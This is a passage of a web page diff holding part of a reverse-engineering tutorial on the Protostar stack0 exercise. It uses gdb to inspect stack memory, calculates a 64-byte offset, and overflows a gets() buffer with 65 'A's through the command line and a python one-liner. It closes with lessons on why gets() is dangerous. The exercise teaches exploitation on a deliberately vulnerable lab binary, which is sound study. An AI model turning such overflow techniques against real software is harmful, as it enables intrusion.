+</span></span><span style=display:flex><span><span style=color:#f92672>(</span>gdb<span style=color:#f92672>)</span> b *0x08048411
+</span></span><span style=display:flex><span>Breakpoint <span style=color:#ae81ff>2</span> at 0x8048411: file stack0/stack0.c, line 13.
+</span></span><span style=display:flex><span><span style=color:#f92672>(</span>gdb<span style=color:#f92672>)</span> r
+</span></span><span style=display:flex><span>Starting program: /opt/protostar/bin/stack0 
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>Breakpoint 1, 0x0804840c in main <span style=color:#f92672>(</span>argc<span style=color:#f92672>=</span>1, argv<span style=color:#f92672>=</span>0xbffff864<span style=color:#f92672>)</span>
+</span></span><span style=display:flex><span>    at stack0/stack0.c:11
+</span></span><span style=display:flex><span>11	stack0/stack0.c: No such file or directory.
+</span></span><span style=display:flex><span>	in stack0/stack0.c
+</span></span><span style=display:flex><span><span style=color:#f92672>(</span>gdb<span style=color:#f92672>)</span> 
+</span></span></code></pre></div><p>Now, we are stopped right before executing the gets call. We know that the input is taken at esp+0x1c and the target variable is located at esp+0x5c. So, let&rsquo;s see the state of the program memory around these areas.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell data-lang=shell><span style=display:flex><span><span style=color:#f92672>(</span>gdb<span style=color:#f92672>)</span> x/30x $esp
+</span></span><span style=display:flex><span>0xbffff750:	0xbffff76c	0x00000001	0xb7fff8f8	0xb7f0186e
+</span></span><span style=display:flex><span>0xbffff760:	0xb7fd7ff4	0xb7ec6165	0xbffff778	0xb7eada75
+</span></span><span style=display:flex><span>0xbffff770:	0xb7fd7ff4	0x08049620	0xbffff788	0x080482e8
+</span></span><span style=display:flex><span>0xbffff780:	0xb7ff1040	0x08049620	0xbffff7b8	0x08048469
+</span></span><span style=display:flex><span>0xbffff790:	0xb7fd8304	0xb7fd7ff4	0x08048450	0xbffff7b8
+</span></span><span style=display:flex><span>0xbffff7a0:	0xb7ec6365	0xb7ff1040	0x0804845b	0x00000000
+</span></span><span style=display:flex><span>0xbffff7b0:	0x08048450	0x00000000	0xbffff838	0xb7eadc76
+</span></span><span style=display:flex><span>0xbffff7c0:	0x00000001	0xbffff864
+</span></span></code></pre></div><p>This shows us that the stack pointer is at 0xbffff750, the value at esp+0x1c (i.e. 0xbffff76c) is some non-zero value and the value at esp+0x5c (i.e. 0xbffff7ac) is 0 (matches the variable initialization value). Let&rsquo;s continue further to the next step, enter some known data as input and see the state of memory again.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell data-lang=shell><span style=display:flex><span><span style=color:#f92672>(</span>gdb<span style=color:#f92672>)</span> c
+</span></span><span style=display:flex><span>Continuing.
+</span></span><span style=display:flex><span>AAAAAAAAAAAA
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>Breakpoint 2, main <span style=color:#f92672>(</span>argc<span style=color:#f92672>=</span>1, argv<span style=color:#f92672>=</span>0xbffff864<span style=color:#f92672>)</span> at stack0/stack0.c:13
+</span></span><span style=display:flex><span>13	in stack0/stack0.c
+</span></span><span style=display:flex><span><span style=color:#f92672>(</span>gdb<span style=color:#f92672>)</span> x/30x $esp
+</span></span><span style=display:flex><span>0xbffff750:	0xbffff76c	0x00000001	0xb7fff8f8	0xb7f0186e
+</span></span><span style=display:flex><span>0xbffff760:	0xb7fd7ff4	0xb7ec6165	0xbffff778	0x41414141
+</span></span><span style=display:flex><span>0xbffff770:	0x41414141	0x41414141	0xbffff700	0x080482e8
+</span></span><span style=display:flex><span>0xbffff780:	0xb7ff1040	0x08049620	0xbffff7b8	0x08048469
+</span></span><span style=display:flex><span>0xbffff790:	0xb7fd8304	0xb7fd7ff4	0x08048450	0xbffff7b8
+</span></span><span style=display:flex><span>0xbffff7a0:	0xb7ec6365	0xb7ff1040	0x0804845b	0x00000000
+</span></span><span style=display:flex><span>0xbffff7b0:	0x08048450	0x00000000	0xbffff838	0xb7eadc76
+</span></span><span style=display:flex><span>0xbffff7c0:	0x00000001	0xbffff864
+</span></span><span style=display:flex><span><span style=color:#f92672>(</span>gdb<span style=color:#f92672>)</span>
+</span></span></code></pre></div><p>We entered <code>AAAAAAAAAAAA</code> as the input, i.e., 12 &lsquo;A&rsquo; characters as input and notice that 12 bytes starting from 0xbffff76c onwards now reflect as 0x41 (which is the <a href=http://www.asciitable.com/>ascii value</a> of A). So if we enter more number of As, we can continue overwriting more memory locations with 0x41 till we reach esp+0x5c. We can find the distance between the input variable and output variable addresses by doing this simple calculation of (esp+0x5c - esp+0x1c) or (0xbffff7ac - 0xbffff76c) which comes out to be 0x40 or 64. So, we need to input more than 64 As into the program to modify the variable and get the desired result.</p><p>Try this out now on regular command line:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell data-lang=shell><span style=display:flex><span>user@protostar:/opt/protostar/bin$ ./stack0
+</span></span><span style=display:flex><span>AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+</span></span><span style=display:flex><span>you have changed the <span style=color:#e6db74>&#39;modified&#39;</span> variable
+</span></span></code></pre></div><p>or if you know python</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell data-lang=shell><span style=display:flex><span>user@protostar:/opt/protostar/bin$ python -c <span style=color:#e6db74>&#39;print &#34;A&#34;*65&#39;</span> | ./stack0
+</span></span><span style=display:flex><span>you have changed the <span style=color:#e6db74>&#39;modified&#39;</span> variable
+</span></span></code></pre></div><p>SUCCESS!</p><h3 id=references--lessons-learnt>References / Lessons learnt</h3><p>So, in this article, we learnt:</p><ul><li>About a very basic buffer overflow on the stack and how to exploit it.</li><li>Static and dynamic analysis portions of reverse engineering</li><li>strings command</li><li>Introduction to x86 assembly</li><li>Several gdb commands</li><li>We also learnt that usage of <code>gets</code> function is very dangerous as it doesn&rsquo;t have any kind of check on the amount of input coming from the user versus the space we have to save it.</li></ul><p>You can refer to the below links for reading up more about some of the things discussed above. If you have any queries or suggestions, please leave a comment here or ping me <a href=https://twitter.com/shantanugoel/>@shantanugoel</a></p><ul><li><a href=https://www.owasp.org/index.php/Buffer_Overflow>Buffer Overflow</a></li><li><a href=https://en.wikipedia.org/wiki/Stack_buffer_overflow>Stack Buffer Overflow</a></li><li><a href=https://www.cs.virginia.edu/~evans/cs216/guides/x86.html>X86 Assembly Reference</a></li><li><a href=http://visualgdb.com/gdbreference/commands/>GDB Commands Reference</a></li></ul><div class=blog-tags><a href=https://shantanugoel.com/tags/practical-reverse-engineering-tutorial-series/>practical-reverse-engineering-tutorial-series</a>&nbsp;
 <a href=https://shantanugoel.com/tags/reverse-engineering/>reverse-engineering</a>&nbsp;
 <a href=https://shantanugoel.com/tags/stack-buffer-overflow/>stack-buffer-overflow</a>&nbsp;
 <a href=https://shantanugoel.com/tags/buffer-overflow/>buffer-overflow</a>&nbsp;
 <a href=https://shantanugoel.com/tags/gdb/>gdb</a>&nbsp;
-<a href=https://shantanugoel.com/tags/protostar/>protostar</a>&nbsp;
-</div>
-<hr>
-<section id=social-share>
-<div class="list-inline footer-links">
-<div class=share-box aria-hidden=true>
-<ul class=share>
-<li>
-<a href="//twitter.com/share?url=https%3a%2f%2fshantanugoel.com%2f2017%2f11%2f16%2fpractical-reverse-engineering-tutorial-1%2f&text=Practical%20Reverse%20Engineering%20Tutorials%20Part%201%3a%20Introduction%20%26%20Protostar%20Stack%200&via=shantanugoel" target=_blank title="Share on Twitter">
-<i class="fab fa-twitter"></i>
-</a>
-</li>
-<li>
-<a href="//www.facebook.com/sharer/sharer.php?u=https%3a%2f%2fshantanugoel.com%2f2017%2f11%2f16%2fpractical-reverse-engineering-tutorial-1%2f" target=_blank title="Share on Facebook">
-<i class="fab fa-facebook"></i>
-</a>
-</li>
-<li>
-<a href="//reddit.com/submit?url=https%3a%2f%2fshantanugoel.com%2f2017%2f11%2f16%2fpractical-reverse-engineering-tutorial-1%2f&title=Practical%20Reverse%20Engineering%20Tutorials%20Part%201%3a%20Introduction%20%26%20Protostar%20Stack%200" target=_blank title="Share on Reddit">
-<i class="fab fa-reddit"></i>
-</a>
-</li>
-<li>
-<a href="//www.linkedin.com/shareArticle?url=https%3a%2f%2fshantanugoel.com%2f2017%2f11%2f16%2fpractical-reverse-engineering-tutorial-1%2f&title=Practical%20Reverse%20Engineering%20Tutorials%20Part%201%3a%20Introduction%20%26%20Protostar%20Stack%200" target=_blank title="Share on LinkedIn">
-<i class="fab fa-linkedin"></i>
-</a>
-</li>
-<li>
-<a href="//www.stumbleupon.com/submit?url=https%3a%2f%2fshantanugoel.com%2f2017%2f11%2f16%2fpractical-reverse-engineering-tutorial-1%2f&title=Practical%20Reverse%20Engineering%20Tutorials%20Part%201%3a%20Introduction%20%26%20Protostar%20Stack%200" target=_blank title="Share on StumbleUpon">
-<i class="fab fa-stumbleupon"></i>
-</a>
-</li>
-<li>
-<a href="//www.pinterest.com/pin/create/button/?url=https%3a%2f%2fshantanugoel.com%2f2017%2f11%2f16%2fpractical-reverse-engineering-tutorial-1%2f&description=Practical%20Reverse%20Engineering%20Tutorials%20Part%201%3a%20Introduction%20%26%20Protostar%20Stack%200" target=_blank title="Share on Pinterest">
-<i class="fab fa-pinterest"></i>
-</a>
-</li>
-</ul>
-</div>
-</div>
-</section>
-<h4 class=see-also>See also</h4>
-<ul>
-<li><a href=/2017/12/04/practical-reverse-engineering-tutorial-2-protostar-stack4/>Practical Reverse Engineering Tutorials Part 2: Protostar Stack4</a></li>
-</ul>
-</article>
-<ul class="pager blog-pager">
-<li class=previous>
-<a href=https://shantanugoel.com/2017/09/17/create-bitly-clone-shorturl-static-website/ data-toggle=tooltip data-placement=top title="Create a bit.ly like shorturl static website">&larr; Previous Post</a>
-</li>
-<li class=next>
-<a href=https://shantanugoel.com/2017/12/04/practical-reverse-engineering-tutorial-2-protostar-stack4/ data-toggle=tooltip data-placement=top title="Practical Reverse Engineering Tutorials Part 2: Protostar Stack4">Next Post &rarr;</a>
-</li>
-</ul>
-<div class=disqus-comments>
-<button id=show-comments class="btn btn-default" type=button>Show <span class=disqus-comment-count data-disqus-url=https://shantanugoel.com/2017/11/16/practical-reverse-engineering-tutorial-1>comments</span></button>
-<div id=disqus_thread></div>
-<script type=text/javascript>var disqus_config=function(){this.page.url='https://shantanugoel.com/2017/11/16/practical-reverse-engineering-tutorial-1'}</script>
-</div>
-</div>
-</div>
-</div>
-<footer>
-<div class=container>
-<div class=row>
-<div class="col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1">
-<ul class="list-inline text-center footer-links">
-<li>
-<a href=mailto:shantanu@shantanugoel.com title="Email me">
-<span class="fa-stack fa-lg">
-<i class="fas fa-circle fa-stack-2x"></i>
-<i class="fas fa-envelope fa-stack-1x fa-inverse"></i>
-</span>
-</a>
-</li>
-<li>
-<a href=https://github.com/shantanugoel title=GitHub>
-<span class="fa-stack fa-lg">
-<i class="fas fa-circle fa-stack-2x"></i>
-<i class="fab fa-github fa-stack-1x fa-inverse"></i>
-</span>
-</a>
-</li>
-<li>
-<a href=https://twitter.com/shantanugoel title=Twitter>
-<span class="fa-stack fa-lg">
-<i class="fas fa-circle fa-stack-2x"></i>
-<i class="fab fa-twitter fa-stack-1x fa-inverse"></i>
-</span>
-</a>
-</li>
-<li>
-<a href title=RSS>
-<span class="fa-stack fa-lg">
-<i class="fas fa-circle fa-stack-2x"></i>
-<i class="fas fa-rss fa-stack-1x fa-inverse"></i>
-</span>
-</a>
-</li>
-</ul>
-<p class="credits copyright text-muted">
-Shantanu Goel
+<a href=https://shantanugoel.com/tags/protostar/>protostar</a>&nbsp;</div><hr><section id=social-share><div class="list-inline footer-links"><div class=share-box aria-hidden=true><ul class=share><li><a href="//twitter.com/share?url=https%3a%2f%2fshantanugoel.com%2f2017%2f11%2f16%2fpractical-reverse-engineering-tutorial-1%2f&text=Practical%20Reverse%20Engineering%20Tutorials%20Part%201%3a%20Introduction%20%26%20Protostar%20Stack%200&via=shantanugoel" target=_blank title="Share on Twitter"><i class="fab fa-twitter"></i></a></li><li><a href="//www.facebook.com/sharer/sharer.php?u=https%3a%2f%2fshantanugoel.com%2f2017%2f11%2f16%2fpractical-reverse-engineering-tutorial-1%2f" target=_blank title="Share on Facebook"><i class="fab fa-facebook"></i></a></li><li><a href="//reddit.com/submit?url=https%3a%2f%2fshantanugoel.com%2f2017%2f11%2f16%2fpractical-reverse-engineering-tutorial-1%2f&title=Practical%20Reverse%20Engineering%20Tutorials%20Part%201%3a%20Introduction%20%26%20Protostar%20Stack%200" target=_blank title="Share on Reddit"><i class="fab fa-reddit"></i></a></li><li><a href="//www.linkedin.com/shareArticle?url=https%3a%2f%2fshantanugoel.com%2f2017%2f11%2f16%2fpractical-reverse-engineering-tutorial-1%2f&title=Practical%20Reverse%20Engineering%20Tutorials%20Part%201%3a%20Introduction%20%26%20Protostar%20Stack%200" target=_blank title="Share on LinkedIn"><i class="fab fa-linkedin"></i></a></li><li><a href="//www.stumbleupon.com/submit?url=https%3a%2f%2fshantanugoel.com%2f2017%2f11%2f16%2fpractical-reverse-engineering-tutorial-1%2f&title=Practical%20Reverse%20Engineering%20Tutorials%20Part%201%3a%20Introduction%20%26%20Protostar%20Stack%200" target=_blank title="Share on StumbleUpon"><i class="fab fa-stumbleupon"></i></a></li><li><a href="//www.pinterest.com/pin/create/button/?url=https%3a%2f%2fshantanugoel.com%2f2017%2f11%2f16%2fpractical-reverse-engineering-tutorial-1%2f&description=Practical%20Reverse%20Engineering%20Tutorials%20Part%201%3a%20Introduction%20%26%20Protostar%20Stack%200" target=_blank title="Share on Pinterest"><i class="fab fa-pinterest"></i></a></li></ul></div></div></section><h4 class=see-also>See also</h4><ul><li><a href=/2017/12/04/practical-reverse-engineering-tutorial-2-protostar-stack4/>Practical Reverse Engineering Tutorials Part 2: Protostar Stack4</a></li></ul></article><ul class="pager blog-pager"><li class=previous><a href=https://shantanugoel.com/2017/09/17/create-bitly-clone-shorturl-static-website/ data-toggle=tooltip data-placement=top title="Create a bit.ly like shorturl static website">&larr; Previous Post</a></li><li class=next><a href=https://shantanugoel.com/2017/12/04/practical-reverse-engineering-tutorial-2-protostar-stack4/ data-toggle=tooltip data-placement=top title="Practical Reverse Engineering Tutorials Part 2: Protostar Stack4">Next Post &rarr;</a></li></ul><div class=disqus-comments><button id=show-comments class="btn btn-default" type=button>Show <span class=disqus-comment-count data-disqus-url=https://shantanugoel.com/2017/11/16/practical-reverse-engineering-tutorial-1>comments</span></button><div id=disqus_thread></div><script type=text/javascript>var disqus_config=function(){this.page.url="https://shantanugoel.com/2017/11/16/practical-reverse-engineering-tutorial-1"}</script></div></div></div></div><footer><div class=container><div class=row><div class="col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1"><ul class="list-inline text-center footer-links"><li><a href=mailto:shantanu@shantanugoel.com title="Email me"><span class="fa-stack fa-lg"><i class="fas fa-circle fa-stack-2x"></i>
+<i class="fas fa-envelope fa-stack-1x fa-inverse"></i></span></a></li><li><a href=https://github.com/shantanugoel title=GitHub><span class="fa-stack fa-lg"><i class="fas fa-circle fa-stack-2x"></i>
+<i class="fab fa-github fa-stack-1x fa-inverse"></i></span></a></li><li><a href=https://twitter.com/shantanugoel title=Twitter><span class="fa-stack fa-lg"><i class="fas fa-circle fa-stack-2x"></i>
+<i class="fab fa-twitter fa-stack-1x fa-inverse"></i></span></a></li><li><a href title=RSS><span class="fa-stack fa-lg"><i class="fas fa-circle fa-stack-2x"></i>
+<i class="fas fa-rss fa-stack-1x fa-inverse"></i></span></a></li></ul><p class="credits copyright text-muted">Shantanu Goel
 &nbsp;&bull;&nbsp;&copy;
 2021
 &nbsp;&bull;&nbsp;
-<a href=https://shantanugoel.com>Shantanu Vs The World</a>
-</p>
-<p class="credits theme-by text-muted">
-<a href=https://gohugo.io>Hugo v0.92.2</a> powered &nbsp;&bull;&nbsp; Theme <a href=https://github.com/halogenica/beautifulhugo>Beautiful Hugo</a> adapted from <a href=https://deanattali.com/beautiful-jekyll/>Beautiful Jekyll</a>
-&nbsp;&bull;&nbsp;[<a href=https://github.com/shantanugoel/shantanugoel.com-source/commit/f6965b6df3a3a8d9ebf7c4f3090fe5a4dc1fb5c7>f6965b6d</a>]
-</p>
-</div>
-</div>
-</div>
-</footer><script src=https://cdnjs.cloudflare.com/ajax/libs/KaTeX/0.10.0/katex.min.js integrity=sha384-K3vbOmF2BtaVai+Qk37uypf7VrgBubhQreNQe9aGsz9lB63dIFiQVlJbr92dw2Lx crossorigin=anonymous></script>
+<a href=https://shantanugoel.com>Shantanu Vs The World</a></p><p class="credits theme-by text-muted"><a href=https://gohugo.io>Hugo v0.108.0</a> powered &nbsp;&bull;&nbsp; Theme <a href=https://github.com/halogenica/beautifulhugo>Beautiful Hugo</a> adapted from <a href=https://deanattali.com/beautiful-jekyll/>Beautiful Jekyll</a>
+&nbsp;&bull;&nbsp;[<a href=https://github.com/shantanugoel/shantanugoel.com-source/commit/f6965b6df3a3a8d9ebf7c4f3090fe5a4dc1fb5c7>f6965b6d</a>]</p></div></div></div></footer><script src=https://cdnjs.cloudflare.com/ajax/libs/KaTeX/0.10.0/katex.min.js integrity=sha384-K3vbOmF2BtaVai+Qk37uypf7VrgBubhQreNQe9aGsz9lB63dIFiQVlJbr92dw2Lx crossorigin=anonymous></script>
 <script src=https://cdnjs.cloudflare.com/ajax/libs/KaTeX/0.10.0/contrib/auto-render.min.js integrity=sha384-kmZOZB5ObwgQnS/DuDg6TScgOiWWBiVt0plIRkZCmE6rDZGrEOQeHM5PcHi+nyqe crossorigin=anonymous></script>
 <script src=https://code.jquery.com/jquery-1.12.4.min.js integrity="sha256-ZosEbRLbNQzLpnKIkEdrPv7lOy9C27hHQ+Xp8a4MxAQ=" crossorigin=anonymous></script>
 <script src=https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/js/bootstrap.min.js integrity=sha384-Tc5IQib027qvyjSMfHjOMaLkfuWVxZxUPnCJA7l2mCWNIpG9mGCD8wGNIcPD7Txa crossorigin=anonymous></script>
 <script src=https://shantanugoel.com/js/main.js></script><script>renderMathInElement(document.body)</script><script src=https://cdnjs.cloudflare.com/ajax/libs/photoswipe/4.1.2/photoswipe.min.js integrity=sha384-QELNnmcmU8IR9ZAykt67vGr9/rZJdHbiWi64V88fCPaOohUlHCqUD/unNN0BXSqy crossorigin=anonymous></script>
 <script src=https://cdnjs.cloudflare.com/ajax/libs/photoswipe/4.1.2/photoswipe-ui-default.min.js integrity=sha384-m67o7SkQ1ALzKZIFh4CiTA8tmadaujiTa9Vu+nqPSwDOqHrDmxLezTdFln8077+q crossorigin=anonymous></script><script src=https://shantanugoel.com/js/load-photoswipe.js></script>
-<script type=text/javascript>$(function(){$('#show-comments').on('click',function(){var a='shantanugoel';(function(){var b=document.createElement('script');b.type='text/javascript',b.async=!0,b.src='//'+a+'.disqus.com/embed.js',(document.getElementsByTagName('head')[0]||document.getElementsByTagName('body')[0]).appendChild(b)})(),$(this).hide()})})</script>
-<script id=dsq-count-scr src=//shantanugoel.disqus.com/count.js async></script>
-</body>
-</html>
+<script type=text/javascript>$(function(){$("#show-comments").on("click",function(){var e="shantanugoel";(function(){var t=document.createElement("script");t.type="text/javascript",t.async=!0,t.src="//"+e+".disqus.com/embed.js",(document.getElementsByTagName("head")[0]||document.getElementsByTagName("body")[0]).appendChild(t)})(),$(this).hide()})})</script><script id=dsq-count-scr src=//shantanugoel.disqus.com/count.js async></script></body></html>
